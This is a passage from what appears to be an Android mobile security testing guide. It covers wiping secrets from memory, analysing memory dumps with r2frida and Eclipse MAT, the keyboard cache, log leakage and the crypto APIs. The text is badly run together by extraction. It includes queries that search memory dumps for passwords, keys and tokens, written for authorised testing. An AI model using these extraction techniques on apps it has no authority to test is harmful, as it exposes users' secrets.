override fundestroy(){ if(isDestroyed){ return } valnonSecret:ByteArray =String("RuntimeException").toByteArray(charset("ISO-8859-1")) for(iinkey!!.indices){ key!![i]=nonSecret[i%nonSecret.size] } valout=FileOutputStream("/dev/null") out.write(key) out.flush() out.close() key=null System.gc() } override funisDestroyed():Boolean { return key==null } /**ConstructsSecureSecretKeyinstanceoutofacopyoftheprovidedkeybytes. *Thecallerisresponsibleofclearingthekeyarrayprovidedasinput. *Theinternalcopyofthekeycanbeclearedbycallingthedestroy()method. */ init { this.key=key.clone() this.algorithm =algorithm } } Secureuser-provideddataisthefinalsecureinformationtypeusuallyfoundinmemory. Thisisoftenmanagedbyimple- mentingacustominputmethod,forwhichyoushouldfollowtherecommendationsgivenhere. However,Androidallows informationtobepartiallyerasedfromEditTextbuffersviaacustomEditable.Factory. EditTexteditText =...;// pointyourvariabletoyourEditTextinstance EditText.setEditableFactory(newEditable.Factory(){ public Editable newEditable(CharSequencesource){ ...//returnanewinstanceofasecureimplementationofEditable. } }); 211\nRefer to the SecureSecretKey example above for an example Editable implementation. Note that you will be able tosecurelyhandleallcopiesmadebyeditText.getTextifyouprovideyourfactory. Youcanalsotrytooverwritethe internalEditTextbufferbycallingeditText.setText,butthereisnoguaranteethatthebufferwillnothavebeencopied already. IfyouchoosetorelyonthedefaultinputmethodandEditText,youwillhavenocontroloverthekeyboardor othercomponentsthatareused. Therefore,youshouldusethisapproachforsemi-confidentialinformationonly. Inallcases,makesurethatsensitivedatainmemoryisclearedwhenausersignsoutoftheapplication. Finally,make surethathighlysensitiveinformationisclearedoutthemomentanActivityorFragment’sonPauseeventistriggered. Notethatthismightmeanthatauserhastore-authenticateeverytimetheapplicationresumes. Dynamic Analysis Static analysis will help you identify potential problems, but it can’t provide statistics about how long data has been exposedinmemory,norcanithelpyouidentifyproblemsinclosed-sourcedependencies. Thisiswheredynamicanalysis comesintoplay. Therearevariouswaystoanalyzethememoryofaprocess,e.g.liveanalysisviaadebugger/dynamicinstrumentation andanalyzingoneormorememorydumps. Retrieving and Analyzing a Memory Dump Whether you are using a rooted or a non-rooted device, you can dump the app’s process memory with objection and Fridump. Youcanfindadetailedexplanationofthisprocessinthesection“MemoryDump”,inthechapter“Tampering andReverseEngineeringonAndroid”. Afterthememoryhasbeendumped(e.g.toafilecalled“memory”),dependingonthenatureofthedatayou’relooking for, you’ll need a set of different tools to process and analyze that memory dump. For instance, if you’re focusing on strings,itmightbesufficientforyoutoexecutethecommandstringsorrabin2 -zztoextractthosestrings. ##usingstrings $stringsmemory >strings.txt ##usingrabin2 $rabin2 -ZZmemory >strings.txt Openstrings.txtinyourfavoriteeditoranddigthroughittoidentifysensitiveinformation. However if you’d like to inspect other kind of data, you’d rather want to use radare2 and its search capabilities. See radare2’shelponthesearchcommand(/?) formoreinformationandalistofoptions. Thefollowingshowsonlyasubset ofthem: $r2 <name_of_your_dump_file> [0x00000000]>/? Usage:/[!bf][arg] Searchstuff (see'e??search' foroptions) |Useio.vaforsearchinginnonvirtualaddressingspaces |/foo\x00 searchforstring 'foo\0' |/c[ar] searchforcryptomaterials |/e/E.F/i matchregularexpression |/ifoo searchforstring 'foo' ignoringcase |/m[?][ebm]magicfile searchformagic,filesystemsorbinaryheaders |/v[1248]value lookforan `cfg.bigendian`32bitvalue |/wfoo searchforwidestring 'f\0o\0o\0' |/xff0033 searchforhexstring |/zminmax searchforstringsofgivensize ... Runtime Memory Analysis Insteadofdumpingthememorytoyourhostcomputer,youcanalternativelyuser2frida. Withit,youcananalyzeand inspecttheapp’smemorywhileit’srunning. Forexample,youmayruntheprevioussearchcommandsfromr2fridaand search the memory for a string, hexadecimal values, etc. When doing so, remember to prepend the search command (andanyotherr2fridaspecificcommands)withabackslash: afterstartingthesessionwithr2 frida://usb//<name_- of_your_app>. Formoreinformation,optionsandapproaches,pleaserefertosection“In-MemorySearch”inthechapter“Tamperingand ReverseEngineeringonAndroid”. 212\nExplicitly Dumping and Analyzing the Java Heap For rudimentary analysis, you can use Android Studio’s built-in tools. They are on the Android Monitor tab. To dump memory, selectthedeviceandappyouwanttoanalyzeandclickDumpJavaHeap. Thiswillcreatea.hprof fileinthe capturesdirectory,whichisontheapp’sprojectpath. Tonavigatethroughclassinstancesthatweresavedinthememorydump,selectthePackageTreeViewinthetabshowing the.hprof file. Formoreadvancedanalysisofthememorydump,usetheEclipseMemoryAnalyzerTool(MAT).ItisavailableasanEclipse pluginandasastandaloneapplication. ToanalyzethedumpinMAT,usethehprof-convplatformtool,whichcomeswiththeAndroidSDK. 213\n./hprof-convmemory.hprofmemory-mat.hprof MAT provides several tools for analyzing the memory dump. For example, the Histogram provides an estimate of the numberofobjectsthathavebeencapturedfromagiventype,andtheThreadOverviewshowsprocesses’threadsand stack frames. The Dominator Tree provides information about keep-alive dependencies between objects. You can use regularexpressionstofiltertheresultsthesetoolsprovide. ObjectQueryLanguagestudioisaMATfeaturethatallowsyoutoqueryobjectsfromthememorydumpwithanSQL-like language. ThetoolallowsyoutotransformsimpleobjectsbyinvokingJavamethodsonthem,anditprovidesanAPIfor buildingsophisticatedtoolsontopoftheMAT. SELECT *FROM java.lang.String Intheexampleabove,allStringobjectspresentinthememorydumpwillbeselected. Theresultswillincludetheobject’s class,memoryaddress,value,andretaincount. Tofilterthisinformationandseeonlythevalueofeachstring,usethe followingcode: SELECT toString(object)FROM java.lang.String object Or SELECT object.toString() FROM java.lang.String object SQLsupportsprimitivedatatypesaswell, soyoucandosomethinglikethefollowingtoaccessthecontentofallchar arrays: SELECT toString(arr) FROM char[]arr Don’tbesurprisedifyougetresultsthataresimilartothepreviousresults; afterall,StringandotherJavadatatypes arejustwrappersaroundprimitivedatatypes. Nowlet’sfiltertheresults. Thefollowingsamplecodewillselectallbyte arraysthatcontaintheASN.1OIDofanRSAkey. Thisdoesn’timplythatagivenbytearrayactuallycontainsanRSA(the samebytesequencemaybepartofsomethingelse),butthisisprobable. SELECT *FROM byte[]b WHERE toString(b).matches(".*1\.2\.840\.113549\.1\.1\.1.*") Finally,youdon’thavetoselectwholeobjects. ConsideranSQLanalogy: classesaretables,objectsarerows,andfields arecolumns. Ifyouwanttofindallobjectsthathavea“password”field,youcandosomethinglikethefollowing: SELECT password FROM ".*" WHERE (null !=password) Duringyouranalysis,searchfor: • Indicativefieldnames: “password”,“pass”,“pin”,“secret”,“private”,etc. • Indicativepatterns(e.g.,RSAfootprints)instrings,chararrays,bytearrays,etc. • Knownsecrets(e.g.,acreditcardnumberthatyou’veenteredoranauthenticationtokenprovidedbythebackend) • etc. Repeatingtestsandmemorydumpswillhelpyouobtainstatisticsaboutthelengthofdataexposure. Furthermore,observ- ingthewayaparticularmemorysegment(e.g.,abytearray)changesmayleadyoutosomeotherwiseunrecognizable sensitivedata(moreonthisinthe“Remediation”sectionbelow). Determining Whether the Keyboard Cache Is Disabled for Text Input Fields 214\nPlatform: android MASVSV1: MSTG-STORAGE-5 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis In the layout definition of an activity, you can define TextViews that have XML attributes. If the XML attribute an- droid:inputTypeisgiventhevaluetextNoSuggestions,thekeyboardcachewillnotbeshownwhentheinputfieldis selected. Theuserwillhavetotypeeverythingmanually. <EditText android:id="@+id/KeyBoardCache" android:inputType="textNoSuggestions" /> The code for all input fields that take sensitive information should include this XML attribute to disable the keyboard suggestions. Alternatively,thedevelopercanusethefollowingconstants: XMLandroid:inputType CodeInputType APIlevel textPassword TYPE_TEXT_VARIATION_PASSWORD 3 textVisiblePassword TYPE_TEXT_VARIATION_VISIBLE_PASSWORD 3 numberPassword TYPE_NUMBER_VARIATION_PASSWORD 11 textWebPassword TYPE_TEXT_VARIATION_WEB_PASSWORD 11 Check the application code to verify that none of the input types are being overwritten. For example, by doing findViewById(R.id.KeyBoardCache).setInputType(InputType.TYPE_CLASS_TEXT) the input type of the input field KeyBoardCacheissettotextreenablingthekeyboardcache. Finally,checktheminimumrequiredSDKversionintheAndroidManifest(android:minSdkVersion)sinceitmustsupport theusedconstants(forexample,AndroidSDKversion11isrequiredfortextWebPassword). Otherwise,thecompiledapp wouldnothonortheusedinputtypeconstantsallowingkeyboardcaching. Dynamic Analysis Starttheappandclickintheinputfieldsthattakesensitivedata. Ifstringsaresuggested,thekeyboardcachehasnot beendisabledforthesefields. Testing Logs for Sensitive Data Platform: android MASVSV1: MSTG-STORAGE-3 MASVSV2: MASVS-STORAGE-2 Overview Thistestcasefocusesonidentifyinganysensitiveapplicationdatawithinbothsystemandapplicationlogs. Thefollowing checksshouldbeperformed: 215\n• Analyzesourcecodeforloggingrelatedcode. • Checkapplicationdatadirectoryforlogfiles. • Gathersystemmessagesandlogsandanalyzeforanysensitivedata. Asageneralrecommendationtoavoidpotentialsensitiveapplicationdataleakage,loggingstatementsshouldberemoved fromproductionreleasesunlessdeemednecessarytotheapplicationorexplicitlyidentifiedassafe,e.g.asaresultofa securityaudit. Static Analysis ApplicationswilloftenusetheLogClassandLoggerClasstocreatelogs. Todiscoverthis,youshouldaudittheapplication’s sourcecodeforanysuchloggingclasses. Thesecanoftenbefoundbysearchingforthefollowingkeywords: • Functionsandclasses,suchas: – android.util.Log – Log.d|Log.e|Log.i|Log.v|Log.w|Log.wtf – Logger • Keywordsandsystemoutput: – System.out.print|System.err.print – logfile – logging – logs While preparing the production release, you can use tools like ProGuard (included in Android Studio). To determine whetherallloggingfunctionsfromtheandroid.util.Log classhavebeenremoved, checktheProGuardconfiguration file (proguard-rules.pro) for the following options (according to this example of removing logging code and this article aboutenablingProGuardinanAndroidStudioproject): -assumenosideeffectsclassandroid.util.Log { publicstaticbooleanisLoggable(java.lang.String,int); publicstaticintv(...); publicstaticinti(...); publicstaticintw(...); publicstaticintd(...); publicstaticinte(...); publicstaticintwtf(...); } Note that the example above only ensures that calls to the Log class’ methods will be removed. If the string that will beloggedisdynamicallyconstructed,thecodethatconstructsthestringmayremaininthebytecode. Forexample,the followingcodeissuesanimplicitStringBuildertoconstructthelogstatement: ExampleinJava: Log.v("Privatekeytag","Privatekey[byteformat]:" +key); ExampleinKotlin: Log.v("Privatekeytag","Privatekey[byteformat]: $key") Thecompiledbytecode,however,isequivalenttothebytecodeofthefollowinglogstatement,whichconstructsthestring explicitly: ExampleinJava: Log.v("Privatekeytag",newStringBuilder("Privatekey[byteformat]:").append(key.toString()).toString()); ExampleinKotlin: 216\nLog.v("Privatekeytag",StringBuilder("Privatekey[byteformat]:").append(key).toString()) ProGuardguaranteesremovaloftheLog.vmethodcall. Whethertherestofthecode(new StringBuilder ...) willbe removeddependsonthecomplexityofthecodeandtheProGuardversion. Thisisasecurityriskbecausethe(unused)stringleaksplaintextdataintomemory,whichcanbeaccessedviaadebugger ormemorydumping. Unfortunately,nosilverbulletexistsforthisissue,butoneoptionwouldbetoimplementacustomloggingfacilitythat takessimpleargumentsandconstructsthelogstatementsinternally. SecureLog.v("Privatekey[byteformat]:",key); ThenconfigureProGuardtostripitscalls. Dynamic Analysis Useallthemobileappfunctionsatleastonce,thenidentifytheapplication’sdatadirectoryandlookforlogfiles(/data/ data/<package-name>). Check the application logs to determine whether log data has been generated; some mobile applicationscreateandstoretheirownlogsinthedatadirectory. ManyapplicationdevelopersstilluseSystem.out.printlnorprintStackTraceinsteadofaproperloggingclass. There- fore, your testing strategy must include all output generated while the application is starting, running and closing. To determinewhatdataisdirectlyprintedbySystem.out.printlnorprintStackTrace,youcanuseLogcatasexplained inthechapter“BasicSecurityTesting”,section“MonitoringSystemLogs”. RememberthatyoucantargetaspecificappbyfilteringtheLogcatoutputasfollows: adblogcat |grep "$(adbshellps |grep <package-name>|awk'{print$2}')" IfyoualreadyknowtheappPIDyoumaygiveitdirectlyusing--pidflag. Youmayalsowanttoapplyfurtherfiltersorregularexpressions(usinglogcat’sregexflags-e<expr>,--regex=<expr> forexample)ifyouexpectcertainstringsorpatternstocomeupinthelogs. Testing the Device-Access-Security Policy Platform: android MASVSV1: MSTG-STORAGE-11 MASVSV2: MASVS-STORAGE-1 Overview Appsthatprocessorquerysensitiveinformationshouldruninatrustedandsecureenvironment. Tocreatethisenviron- ment,theappcancheckthedeviceforthefollowing: • PIN-orpassword-protecteddevicelocking • RecentAndroidOSversion • USBDebuggingactivation • Deviceencryption • Devicerooting(seealso“TestingRootDetection”) 217\nStatic Analysis Totestthedevice-access-securitypolicythattheappenforces,awrittencopyofthepolicymustbeprovided. Thepolicy should define available checks and their enforcement. For example, one check could require that the app run only on Android6.0(APIlevel23)oramorerecentversion,closingtheappordisplayingawarningiftheAndroidversionisless than6.0. Checkthesourcecodeforfunctionsthatimplementthepolicyanddeterminewhetheritcanbebypassed. YoucanimplementchecksontheAndroiddevicebyqueryingSettings.Secureforsystempreferences. DeviceAdminis- trationAPIofferstechniquesforcreatingapplicationsthatcanenforcepasswordpoliciesanddeviceencryption. Dynamic Analysis The dynamic analysis depends on the checks enforced by the app and their expected behavior. If the checks can be bypassed,theymustbevalidated. 218\nAndroid Cryptographic APIs Overview Inthechapter“MobileAppCryptography”,weintroducedgeneralcryptographybestpracticesanddescribedtypicalissues thatcanoccurwhencryptographyisusedincorrectly. Inthischapter,we’llgointomoredetailonAndroid’scryptography APIs. We’llshowhowtoidentifyusageofthoseAPIsinthesourcecodeandhowtointerpretcryptographicconfigurations. Whenreviewingcode,makesuretocomparethecryptographicparametersusedwiththecurrentbestpractices,aslinked inthisguide. WecanidentifykeycomponentsofcryptographysystemonAndroid: • SecurityProvider • KeyStore-seethesectionKeyStoreinthe“TestingDataStorage”chapter • KeyChain-seethesectionKeyChaininthe“TestingDataStorage”chapter AndroidcryptographyAPIsarebasedontheJavaCryptographyArchitecture(JCA).JCAseparatestheinterfacesandimple- mentation,makingitpossibletoincludeseveralsecurityprovidersthatcanimplementsetsofcryptographicalgorithms. MostoftheJCAinterfacesandclassesaredefinedinthejava.security.*andjavax.crypto.*packages. Inaddition, thereareAndroidspecificpackagesandroid.security.*andandroid.security.keystore.*. KeyStoreandKeyChainprovideAPIsforstoringandusingkeys(behindthescene,KeyChainAPIusesKeyStoresystem). These systems allow to administer the full lifecycle of the cryptographic keys. Requirements and guidance for imple- mentationofcryptographickeymanagementcanbefoundinKeyManagementCheatSheet. Wecanidentifyfollowing phases: • generatingakey • usingakey • storingakey • archivingakey • deletingakey Pleasenotethatstoringofakeyisanalyzedinthechapter“TestingDataStorage”. These phases are managed by the Keystore/KeyChain system. However how the system works depends on how the application developer implemented it. For the analysis process you should focus on functions which are used by the applicationdeveloper. Youshouldidentifyandverifythefollowingfunctions: • Keygeneration • Randomnumbergeneration • Keyrotation AppsthattargetmodernAPIlevels,wentthroughthefollowingchanges: • ForAndroid7.0(APIlevel24)andabovetheAndroidDeveloperblogshowsthat: – Itisrecommendedtostopspecifyingasecurityprovider. Instead,alwaysuseapatchedsecurityprovider. – The support for the Crypto provider has dropped and the provider is deprecated. The same applies to its SHA1PRNGforsecurerandom. • ForAndroid8.1(APIlevel27)andabovetheDeveloperDocumentationshowsthat: – Conscrypt,knownasAndroidOpenSSL,ispreferredaboveusingBouncyCastleandithasnewimplementations: AlgorithmParameters:GCM , KeyGenerator:AES, KeyGenerator:DESEDE, KeyGenerator:HMACMD5, KeyGen- erator:HMACSHA1, KeyGenerator:HMACSHA224, KeyGenerator:HMACSHA256, KeyGenerator:HMACSHA384, KeyGenerator:HMACSHA512,SecretKeyFactory:DESEDE,andSignature:NONEWITHECDSA. – You should not use the IvParameterSpec.class anymore for GCM, but use the GCMParameterSpec.class instead. – SocketshavechangedfromOpenSSLSocketImpltoConscryptFileDescriptorSocket,andConscryptEngi- neSocket. – SSLSessionwithnullparametersgiveaNullPointerException. 219\n– Youneedtohavelargeenougharraysasinputbytesforgeneratingakeyotherwise,anInvalidKeySpecEx- ceptionisthrown. – IfaSocketreadisinterrupted,yougetaSocketException. • ForAndroid9(APIlevel28)andabovetheAndroidDeveloperBlogshowsevenmorechanges: – YougetawarningifyoustillspecifyasecurityproviderusingthegetInstancemethodandyoutargetany APIbelow28. IfyoutargetAndroid9(APIlevel28)orabove,yougetanerror. – TheCryptosecurityproviderisnowremoved. CallingitwillresultinaNoSuchProviderException. • ForAndroid10(APIlevel29)theDeveloperDocumentationlistsallnetworksecuritychanges. General Recommendations Thefollowinglistofrecommendationsshouldbeconsideredduringappexamination: • Youshouldensurethatthebestpracticesoutlinedinthe“CryptographyforMobileApps”chapterarefollowed. • Youshouldensurethatsecurityproviderhasthelatestupdates-Updatingsecurityprovider. • Youshouldstopspecifyingasecurityproviderandusethedefaultimplementation(AndroidOpenSSL,Conscrypt). • YoushouldstopusingCryptosecurityprovideranditsSHA1PRNGastheyaredeprecated. • YoushouldspecifyasecurityprovideronlyfortheAndroidKeystoresystem. • YoushouldstopusingPassword-basedencryptioncipherswithoutIV. • YoushoulduseKeyGenParameterSpecinsteadofKeyPairGeneratorSpec. Security Provider Androidreliesonthejava.security.ProviderclasstoimplementJavaSecurityservices. Theseprovidersarecrucialto ensuresecurenetworkcommunicationsandsecureotherfunctionalitieswhichdependoncryptography. ThelistofsecurityprovidersincludedinAndroidvariesbetweenversionsofAndroidandtheOEM-specificbuilds. Some securityproviderimplementationsinolderversionsarenowknowntobelesssecureorvulnerable. Thus,Androidappli- cationsshouldnotonlychoosethecorrectalgorithmsandprovideagoodconfiguration,insomecasestheyshouldalso payattentiontothestrengthoftheimplementationsinthelegacysecurityproviders. Youcanlistthesetofexistingsecurityprovidersusingfollowingcode: StringBuilderbuilder =newStringBuilder(); for(Providerprovider :Security.getProviders()){ builder.append("provider:") .append(provider.getName()) .append("") .append(provider.getVersion()) .append("(") .append(provider.getInfo()) .append(")\n"); } Stringproviders =builder.toString(); //nowdisplaythestringonthescreenorinthelogsfordebugging. ThisistheoutputforAndroid9(APIlevel28)runninginanemulatorwithGooglePlayAPIs: provider:AndroidNSSP1.0(AndroidNetworkSecurityPolicyProvider) provider:AndroidOpenSSL1.0(Android'sOpenSSL-backedsecurityprovider) provider:CertPathProvider1.0(ProviderofCertPathBuilderandCertPathVerifier) provider:AndroidKeyStoreBCWorkaround1.0(AndroidKeyStoresecurityprovidertoworkaroundBouncyCastle) provider:BC1.57(BouncyCastleSecurityProviderv1.57) provider:HarmonyJSSE1.0(HarmonyJSSEProvider) provider:AndroidKeyStore1.0(AndroidKeyStoresecurityprovider) Updating security provider Keeping up-to-date and patched component is one of security principles. The same applies to provider. Application shouldcheckifusedsecurityproviderisup-to-dateandifnot,updateit. 220\nOlder Android versions ForsomeapplicationsthatsupportolderversionsofAndroid(e.g.: onlyusedversionslowerthanAndroid7.0(APIlevel 24)),bundlinganup-to-datelibrarymaybetheonlyoption. Conscryptlibraryisagoodchoiceinthissituationtokeep thecryptographyconsistentacrossthedifferentAPIlevelsandavoidhavingtoimportBouncyCastlewhichisaheavier library. ConscryptforAndroidcanbeimportedthisway: dependencies { implementation 'org.conscrypt:conscrypt-android:last_version' } Next,theprovidermustberegisteredbycalling: Security.addProvider(Conscrypt.newProvider()) Key Generation The Android SDK allows you to specify how a key should be generated, and under which circumstances it can be used. Android6.0(APIlevel23)introducedtheKeyGenParameterSpecclassthatcanbeusedtoensurethecorrectkeyusage intheapplication. Forexample: StringkeyAlias ="MySecretKey"; KeyGenParameterSpeckeyGenParameterSpec =newKeyGenParameterSpec.Builder(keyAlias, KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_CBC) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7) .setRandomizedEncryptionRequired(true) .build(); KeyGeneratorkeyGenerator =KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore"); keyGenerator.init(keyGenParameterSpec); SecretKeysecretKey =keyGenerator.generateKey(); TheKeyGenParameterSpecindicatesthatthekeycanbeusedforencryptionanddecryption,butnotforotherpurposes, suchassigningorverifying. Itfurtherspecifiestheblockmode(CBC),padding(PKCS#7), andexplicitlyspecifiesthat randomizedencryptionisrequired(thisisthedefault). Next,weenterAndroidKeyStoreasthenameoftheproviderin theKeyGenerator.getInstancecalltoensurethatthekeysarestoredintheAndroidKeyStore. GCMisanotherAESblockmodethatprovidesadditionalsecuritybenefitsoverother,oldermodes. Inadditiontobeing cryptographicallymoresecure,italsoprovidesauthentication. WhenusingCBC(andothermodes),authenticationwould needtobeperformedseparately,usingHMACs(seethe“TamperingandReverseEngineeringonAndroid”chapter). Note thatGCMistheonlymodeofAESthatdoesnotsupportpadding. Attemptingtousethegeneratedkeyinviolationoftheabovespecwouldresultinasecurityexception. Here’sanexampleofusingthatkeytoencrypt: StringAES_MODE =KeyProperties.KEY_ALGORITHM_AES +"/"+KeyProperties.BLOCK_MODE_CBC +"/"+KeyProperties.ENCRYPTION_PADDING_PKCS7; KeyStoreAndroidKeyStore =AndroidKeyStore.getInstance("AndroidKeyStore"); //byte[]input Keykey =AndroidKeyStore.getKey(keyAlias,null); Ciphercipher =Cipher.getInstance(AES_MODE); cipher.init(Cipher.ENCRYPT_MODE,key); byte[]encryptedBytes =cipher.doFinal(input); byte[]iv=cipher.getIV(); //saveboththeIVandtheencryptedBytes BoththeIV(initializationvector)andtheencryptedbytesneedtobestored;otherwisedecryptionisnotpossible. Here’showthatciphertextwouldbedecrypted. Theinputistheencryptedbytearrayandivistheinitializationvector fromtheencryptionstep: 221\n//byte[]input //byte[]iv Keykey =AndroidKeyStore.getKey(AES_KEY_ALIAS,null); Ciphercipher =Cipher.getInstance(AES_MODE); IvParameterSpecparams =newIvParameterSpec(iv); cipher.init(Cipher.DECRYPT_MODE,key,params); byte[]result =cipher.doFinal(input); SincetheIVisrandomlygeneratedeachtime,itshouldbesavedalongwiththeciphertext(encryptedBytes)inorderto decryptitlater. Prior to Android 6.0 (API level 23), AES key generation was not supported. As a result, many implementations chose to use RSA and generated a public-private key pair for asymmetric encryption using KeyPairGeneratorSpec or used SecureRandomtogenerateAESkeys. Here’sanexampleofKeyPairGeneratorandKeyPairGeneratorSpecusedtocreatetheRSAkeypair: DatestartDate =Calendar.getInstance().getTime(); CalendarendCalendar =Calendar.getInstance(); endCalendar.add(Calendar.YEAR,1); DateendDate =endCalendar.getTime(); KeyPairGeneratorSpeckeyPairGeneratorSpec =newKeyPairGeneratorSpec.Builder(context) .setAlias(RSA_KEY_ALIAS) .setKeySize(4096) .setSubject(newX500Principal("CN=" +RSA_KEY_ALIAS)) .setSerialNumber(BigInteger.ONE) .setStartDate(startDate) .setEndDate(endDate) .build(); KeyPairGeneratorkeyPairGenerator =KeyPairGenerator.getInstance("RSA", "AndroidKeyStore"); keyPairGenerator.initialize(keyPairGeneratorSpec); KeyPairkeyPair =keyPairGenerator.generateKeyPair(); This sample creates the RSA key pair with a key size of 4096-bit (i.e. modulus size). Elliptic Curve (EC) keys can also begeneratedinasimilarway. HoweverasofAndroid11(APIlevel30),AndroidKeyStoredoesnotsupportencryptionor decryptionwithECkeys. Theycanonlybeusedforsignatures. AsymmetricencryptionkeycanbegeneratedfromthepassphrasebyusingthePasswordBasedKeyDerivationFunction version 2 (PBKDF2). This cryptographic protocol is designed to generate cryptographic keys, which can be used for cryptographypurpose. Inputparametersforthealgorithmareadjustedaccordingtoweakkeygenerationfunctionsection. Thecodelistingbelowillustrateshowtogenerateastrongencryptionkeybasedonapassword. public static SecretKey generateStrongAESKey(char[]password,intkeyLength) { //Initializeobjectsandvariablesforlateruse intiterationCount =10000; intsaltLength =keyLength /8; SecureRandomrandom =newSecureRandom(); //Generatethesalt byte[]salt =newbyte[saltLength]; random.nextBytes(salt); KeySpeckeySpec =newPBEKeySpec(password.toCharArray(),salt,iterationCount,keyLength); SecretKeyFactorykeyFactory =SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1"); byte[]keyBytes =keyFactory.generateSecret(keySpec).getEncoded(); return newSecretKeySpec(keyBytes,"AES"); } Theabovemethodrequiresacharacterarraycontainingthepasswordandtheneededkeylengthinbits,forinstancea128 or256-bitAESkey. Wedefineaniterationcountof10,000roundswhichwillbeusedbythePBKDF2algorithm. Increasing the number of iterations significantly increases the workload for a brute-force attack on the password, however it can affectperformanceasmorecomputationalpowerisrequiredforkeyderivation. Wedefinethesaltsizeequaltothekey lengthdividedby8inordertoconvertfrombitstobytesandweusetheSecureRandomclasstorandomlygenerateasalt. Thesaltneedstobekeptconstanttoensurethesameencryptionkeyisgeneratedtimeaftertimeforthesamesupplied password. NotethatyoucanstorethesaltprivatelyinSharedPreferences. Itisrecommendedtoexcludethesaltfrom theAndroidbackupmechanismtopreventsynchronizationincaseofhigherriskdata. 222\nNote that if you take a rooted device or a patched (e.g. repackaged) application into account as a threat to the data,itmightbebettertoencryptthesaltwithakeythatisplacedintheAndroidKeystore. ThePassword-Based Encryption(PBE)keyisgeneratedusingtherecommendedPBKDF2WithHmacSHA1algorithm,untilAndroid8.0(API level26). ForhigherAPIlevels,itisbesttousePBKDF2withHmacSHA256,whichwillendupwithalongerhashvalue. Note: thereisawidespreadfalsebelievethattheNDKshouldbeusedtohidecryptographicoperationsandhardcoded keys. However,usingthismechanismisnoteffective. Attackerscanstillusetoolstofindthemechanismusedandmake dumpsofthekeyinmemory. Next,thecontrolflowcanbeanalyzedwithe.g.radare2andthekeysextractedwiththe help of Frida or the combination of both: r2frida (see sections “Disassembling Native Code”, “Memory Dump” and “In- MemorySearch”inthechapter“TamperingandReverseEngineeringonAndroid”formoredetails). FromAndroid7.0(API level24)onward,itisnotallowedtouseprivateAPIs,instead: publicAPIsneedtobecalled,whichfurtherimpactsthe effectivenessofhidingitawayasdescribedintheAndroidDevelopersBlog Random number generation Cryptographyrequiressecurepseudorandomnumbergeneration(PRNG).StandardJavaclassesasjava.util.Random donotprovidesufficientrandomnessandinfactmaymakeitpossibleforanattackertoguessthenextvaluethatwillbe generated,andusethisguesstoimpersonateanotheruseroraccesssensitiveinformation. Ingeneral,SecureRandomshouldbeused. However,iftheAndroidversionsbelowAndroid4.4(APIlevel19)aresupported, additionalcareneedstobetakeninordertoworkaroundthebuginAndroid4.1-4.3(APIlevel16-18)versionsthatfailed toproperlyinitializethePRNG. MostdevelopersshouldinstantiateSecureRandomviathedefaultconstructorwithoutanyarguments. Otherconstructors areformoreadvancedusesand,ifusedincorrectly,canleadtodecreasedrandomnessandsecurity. ThePRNGprovider backingSecureRandomusestheSHA1PRNGfromAndroidOpenSSL(Conscrypt)provider. Testing Symmetric Cryptography Platform: android MASVSV1: MSTG-CRYPTO-1 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis Identify all the instances of symmetric key encryption in code and look for any mechanism which loads or provides a symmetrickey. Youcanlookfor: • symmetricalgorithms(suchasDES,AES,etc.) • specifications for a key generator (such as KeyGenParameterSpec, KeyPairGeneratorSpec, KeyPairGenerator, KeyGenerator,KeyProperties,etc.) • classesimportingjava.security.*,javax.crypto.*,android.security.*,android.security.keystore.* Checkalsothelistofcommoncryptographicconfigurationissues. Foreachidentifiedinstanceverifyiftheusedsymmetrickeys: • arenotpartoftheapplicationresources • cannotbederivedfromknownvalues • arenothardcodedincode Foreachhardcodedsymmetrickey, verifythatisnotusedinsecurity-sensitivecontextsastheonlymethodofencryp- tion. 223\nAsanexampleweillustratehowtolocatetheuseofahardcodedencryptionkey. Firstdisassembleanddecompilethe apptoobtainJavacode,e.g.byusingjadx. NowsearchthefilesfortheusageoftheSecretKeySpecclass,e.g.bysimplyrecursivelygreppingonthemorusingjadx searchfunction: grep -r"SecretKeySpec" ThiswillreturnallclassesusingtheSecretKeySpecclass. Nowexaminethosefilesandtracewhichvariablesareusedto passthekeymaterial. Thefigurebelowshowstheresultofperformingthisassessmentonaproductionreadyapplication. WecanclearlylocatetheuseofastaticencryptionkeythatishardcodedandinitializedinthestaticbytearrayEncrypt. keyBytes. Dynamic Analysis Youcanusemethodtracingoncryptographicmethodstodetermineinput/outputvaluessuchasthekeysthatarebeing used. Monitor file system access while cryptographic operations are being performed to assess where key material is writtentoorreadfrom. Forexample,monitorthefilesystembyusingtheAPImonitorofRMS-RuntimeMobileSecurity. Testing the Configuration of Cryptographic Standard Algorithms Platform: android MASVSV1: MSTG-CRYPTO-2,MSTG-CRYPTO-3,MSTG-CRYPTO-4 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis Identifyalltheinstancesofthecryptographicprimitivesincode. Identifyallcustomcryptographyimplementations. You canlookfor: • classesCipher,Mac,MessageDigest,Signature 224\n• interfacesKey,PrivateKey,PublicKey,SecretKey • functionsgetInstance,generateKey • exceptionsKeyStoreException,CertificateException,NoSuchAlgorithmException • classeswhichusesjava.security.*,javax.crypto.*,android.security.*andandroid.security.keystore. *packages. IdentifythatallcallstogetInstanceusedefaultproviderofsecurityservicesbynotspecifyingit(itmeansAndroidOpenSSL akaConscrypt). ProvidercanonlybespecifiedinKeyStorerelatedcode(inthatsituationKeyStoreshouldbeprovided asprovider). Ifotherproviderisspecifieditshouldbeverifiedaccordingtosituationandbusinesscase(i.e.Android APIversion),andprovidershouldbeexaminedagainstpotentialvulnerabilities. Ensurethatthebestpracticesoutlinedinthe“CryptographyforMobileApps”chapterarefollowed. Lookatinsecureand deprecatedalgorithmsandcommonconfigurationissues. Dynamic Analysis Youcanusemethodtracingoncryptographicmethodstodetermineinput/outputvaluessuchasthekeysthatarebeing used. Monitor file system access while cryptographic operations are being performed to assess where key material is writtentoorreadfrom. Forexample,monitorthefilesystembyusingtheAPImonitorofRMS-RuntimeMobileSecurity. Testing Random Number Generation Platform: android MASVSV1: MSTG-CRYPTO-6 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis Identifyalltheinstancesofrandomnumbergeneratorsandlookforeithercustomorwell-knowninsecureclasses. For instance, 